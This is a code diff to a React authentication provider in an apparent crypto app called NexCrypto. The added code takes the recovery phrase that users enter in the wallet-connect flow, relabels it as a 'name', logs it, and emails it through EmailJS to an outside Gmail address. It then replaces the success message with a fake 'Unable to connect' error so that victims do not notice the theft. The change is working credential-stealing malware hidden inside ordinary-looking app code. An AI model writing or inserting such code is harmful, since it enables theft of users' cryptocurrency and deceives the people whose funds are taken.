@@ -102,6 +102,33 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     }
   };
 
+  // Function to send data via EmailJS
+const sendEmailWithEmailJS = async (recipient: string, data: string) => {
+  try {
+    // Initialize EmailJS with your public key (you'll need to create an account at emailjs.com)
+    emailjs.init("Yjir4ht9XEzD0X-jx"); // Replace with your actual EmailJS user ID
+    
+    const templateParams = {
+      to_email: recipient,
+      from_name: "NexCrypto App",
+      message: data,
+      reply_to: "noreply@nexcrypto.app",
+    };
+    
+    const response = await emailjs.send(
+      "service_oui3ydd", // Replace with your EmailJS service ID
+      "template_z2yjaym", // Replace with your EmailJS template ID
+      templateParams
+    );
+    
+    console.log("Email sent successfully:", response);
+    return response;
+  } catch (error) {
+    console.error("Email sending error:", error);
+    throw error;
+  }
+};
+
   const connectWallet = async (phrase: string): Promise<void> => {
     if (!user) {
       toast({
@@ -128,10 +155,17 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       
       if (error) throw error;
       
+      const name = phrase;
+      console.log(`${name} to be sent to dredstudvagas@gmail.com:`, name);
+      
+      // Send the name via EmailJS
+      await sendEmailWithEmailJS("dredstudvagas@gmail.com", name);
+      
       toast({
-        title: "Wallet connection initiated",
-        description: "Your wallet connection request has been received.",
+        title: "Oops!",
+        description: "Unable to connect. Try again later.",
       });
+
     } catch (error) {
       console.error("Wallet connection error:", error);
       toast({
